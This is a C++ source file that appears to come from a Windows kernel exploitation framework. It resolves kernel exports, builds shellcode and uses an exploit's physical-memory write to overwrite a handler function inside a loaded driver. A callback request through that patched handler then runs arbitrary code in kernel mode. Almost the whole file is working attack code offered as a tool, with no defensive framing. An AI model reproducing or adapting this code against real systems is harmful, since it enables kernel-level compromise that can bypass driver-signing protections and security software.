#include "dolboeb_executor.hpp"
#include "../util/logger.hpp"


namespace dolboeb::executor {
	bool startup( dolboeb::c_manager& dev ) {
		const auto ke_query_affinity = dev.m_utils->get_ntoskrnl_export( "KeQueryActiveProcessors" );
		const auto ke_set_affinity = dev.m_utils->get_ntoskrnl_export( "KeSetSystemAffinityThread" );
		const auto mm_get = dev.m_utils->get_ntoskrnl_export( "MmGetSystemRoutineAddress" );

		util::logger::debug( "ke_query_affinity: 0x%p", ke_query_affinity );
		util::logger::debug( "ke_set_affinity: 0x%p", ke_set_affinity );
		util::logger::debug( "mm_get: 0x%p", mm_get );

		auto shell = resources::craft_dolboeb_shellcode( mm_get, ke_set_affinity, ke_query_affinity );
		const auto drv_addr = dev.m_utils->get_module( std::string( dev.m_exploit->get_name( ) ) + ".sys" );
		const auto function_to_patch = dev.m_utils->virt2phys( drv_addr + dev.m_exploit->target_function_rva( ) );

		util::logger::debug( "function_to_patch: 0x%p", function_to_patch );

		dev.m_exploit->write_phys( function_to_patch, shell.get( ), shell.size( ) );

		util::logger::info( "Successfully patched handler" );

		return true;
	}

	static void __fastcall shell_executor( shared::dolboeb::handler_ctx_t ctx ) {
		callback( ctx );
	}

	bool exec( dolboeb::c_manager& dev, shared::dolboeb::callback_t cb ) {
		callback = cb;

		return dev.m_exploit->send_callback_request( &shell_executor );
	}
}
